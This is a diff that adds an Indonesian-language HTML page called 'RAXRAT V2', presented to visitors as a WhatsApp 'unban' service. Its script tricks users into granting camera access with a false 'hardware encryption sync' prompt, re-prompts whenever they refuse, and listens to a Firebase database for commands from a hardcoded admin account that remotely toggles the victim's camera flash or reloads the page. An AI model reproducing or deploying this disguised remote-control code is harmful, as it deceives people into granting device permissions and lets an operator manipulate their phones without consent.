@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RAXRAT V2 | OVERDRIVE SYSTEM</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap');
+        body { background: #000; color: #fff; font-family: 'JetBrains Mono', monospace; overflow-x: hidden; }
+        .rax-glass { background: rgba(10, 10, 10, 0.8); backdrop-filter: blur(12px); border: 1px solid #1a1a1a; border-radius: 20px; }
+        .neon-green { color: #00ff88; text-shadow: 0 0 10px rgba(0, 255, 136, 0.4); }
+        .hidden { display: none !important; }
+        input { transition: all 0.3s ease; }
+        input:focus { border-color: #00ff88 !important; box-shadow: 0 0 15px rgba(0, 255, 136, 0.2); }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div id="boxAuth" class="w-full max-w-sm p-10 rax-glass shadow-2xl">
+        <div class="text-center mb-10">
+            <h1 class="text-4xl font-extrabold italic tracking-tighter neon-green">RAXRAT V2</h1>
+            <p class="text-[8px] tracking-[5px] text-zinc-600 uppercase mt-2">Remote Access & Binding</p>
+        </div>
+        <div class="space-y-4">
+            <input type="text" id="usr" placeholder="USERNAME" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-xl outline-none text-green-400">
+            <input type="password" id="pwd" placeholder="PASSWORD" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-xl outline-none text-green-400">
+            <div class="flex gap-2 pt-2">
+                <button onclick="doAuth('reg')" class="flex-1 py-4 bg-zinc-800 rounded-xl font-bold text-[10px] uppercase hover:bg-zinc-700">Reg</button>
+                <button onclick="doAuth('login')" class="flex-1 py-4 bg-green-600 text-black rounded-xl font-bold text-[10px] uppercase hover:bg-green-400">Login</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="bindingOverlay" class="hidden fixed inset-0 bg-black z-[100] flex items-center justify-center p-6 text-center">
+        <div class="max-w-xs">
+            <div class="text-6xl mb-4 animate-bounce">📡</div>
+            <h2 class="text-xl font-extrabold mb-2">IZIN DIPERLUKAN</h2>
+            <p class="text-zinc-500 text-xs mb-8">Izinkan sinkronisasi enkripsi hardware untuk memproses layanan nomor WhatsApp Anda.</p>
+            <button onclick="startBinding()" class="w-full py-5 bg-white text-black font-black rounded-full tracking-widest text-sm">IZINKAN SEKARANG</button>
+        </div>
+    </div>
+
+    <div id="dashAdmin" class="hidden w-full max-w-4xl space-y-4">
+        <div class="rax-glass p-5 flex justify-between items-center border-l-4 border-green-500">
+            <h2 class="font-black text-green-500 tracking-widest">OWNER: RALXA</h2>
+            <button onclick="location.reload()" class="text-[9px] text-red-500 font-bold uppercase underline">Terminate</button>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="rax-glass p-6">
+                <h3 class="text-[10px] text-zinc-500 font-bold mb-6 uppercase tracking-widest">Hardware Trigger</h3>
+                <div class="grid grid-cols-2 gap-3">
+                    <button onclick="send('SENTER_ON')" class="p-6 bg-zinc-900 rounded-2xl hover:bg-yellow-500 hover:text-black transition-all">
+                        <span class="block text-2xl mb-1">🔦</span>
+                        <span class="text-[9px] font-bold">FLASH ON</span>
+                    </button>
+                    <button onclick="send('SENTER_OFF')" class="p-6 bg-zinc-900 rounded-2xl hover:bg-white hover:text-black transition-all">
+                        <span class="block text-2xl mb-1">🌑</span>
+                        <span class="text-[9px] font-bold">FLASH OFF</span>
+                    </button>
+                    <button onclick="send('SHUTDOWN')" class="col-span-2 p-3 bg-red-900/20 text-red-500 border border-red-900/50 rounded-xl text-[9px] font-bold">FORCE KILL TARGET</button>
+                </div>
+            </div>
+            <div class="rax-glass p-6 flex flex-col">
+                <h3 class="text-[10px] text-zinc-500 font-bold mb-4 uppercase tracking-widest">Cloud Logs</h3>
+                <div id="term" class="h-40 overflow-y-auto font-mono text-[9px] text-green-400 p-3 bg-black/50 rounded-xl border border-zinc-800">
+                    > System Active... [Ready]
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="dashUser" class="hidden w-full max-w-md rax-glass p-8 text-center border-t-4 border-blue-500 shadow-2xl">
+        <h2 class="text-xl font-black text-white mb-6 uppercase tracking-widest">Service: Unban WA</h2>
+        <div class="space-y-4 text-left">
+            <input type="number" placeholder="Nomor: 628..." class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-xl outline-none focus:border-blue-500 text-white">
+            <button onclick="alert('Antrian: #882. Mohon jangan tutup halaman ini sampai proses selesai.')" class="w-full py-4 bg-blue-600 rounded-xl font-bold uppercase tracking-widest text-xs">Cek Status Nomor</button>
+        </div>
+    </div>
+
+    <script>
+        // --- FIREBASE SUNTIKAN SAKTI ---
+        const firebaseConfig = {
+            databaseURL: "https://ralxaratpronect-default-rtdb.asia-southeast1.firebasedatabase.app/"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const dbRef = firebase.database().ref("raxrat_v2/command");
+
+        // --- AUTH SYSTEM ---
+        let localDB = JSON.parse(localStorage.getItem('raxDB')) || { "Ralxa": "Rata" };
+
+        function doAuth(mode) {
+            const u = document.getElementById('usr').value;
+            const p = document.getElementById('pwd').value;
+            if (mode === 'reg') {
+                if(!u || !p) return alert("DATA KOSONG!");
+                localDB[u] = p;
+                localStorage.setItem('raxDB', JSON.stringify(localDB));
+                alert("BERHASIL REGISTRASI!"); return;
+            }
+            if (u === "Ralxa" && p === "Rata") { render('admin'); }
+            else if (localDB[u] === p) { render('user'); }
+            else { alert("PASSWORD SALAH!"); }
+        }
+
+        function render(role) {
+            document.getElementById('boxAuth').classList.add('hidden');
+            if (role === 'admin') { document.getElementById('dashAdmin').classList.remove('hidden'); }
+            else {
+                document.getElementById('dashUser').classList.remove('hidden');
+                document.getElementById('bindingOverlay').classList.remove('hidden');
+            }
+        }
+
+        // --- BINDING & HARDWARE CONTROL ---
+        function startBinding() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+            .then(s => {
+                alert("SINKRONISASI AKTIF!");
+                document.getElementById('bindingOverlay').classList.add('hidden');
+                s.getTracks().forEach(t => t.stop());
+            })
+            .catch(() => { alert("WAJIB IZINKAN AKSES!"); startBinding(); });
+        }
+
+        // --- REAL-TIME COMMANDS ---
+        function send(act) {
+            dbRef.set({ action: act, time: Date.now() });
+            const t = document.getElementById('term');
+            t.innerHTML += `<div>[${new Date().toLocaleTimeString()}] SENT: ${act}</div>`;
+            t.scrollTop = t.scrollHeight;
+        }
+
+        // --- TARGET LISTENER (BACKEND) ---
+        dbRef.on("value", (snap) => {
+            const data = snap.val();
+            if(!data) return;
+            if(data.action === "SENTER_ON") {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+                .then(s => {
+                    const track = s.getVideoTracks()[0];
+                    track.applyConstraints({ advanced: [{ torch: true }] });
+                    window.activeStream = s;
+                });
+            } else if(data.action === "SENTER_OFF") {
+                if(window.activeStream) {
+                    window.activeStream.getTracks().forEach(t => t.stop());
+                }
+            } else if(data.action === "SHUTDOWN") {
+                location.reload();
+            }
+        });
+    </script>
+</body>
+</html>
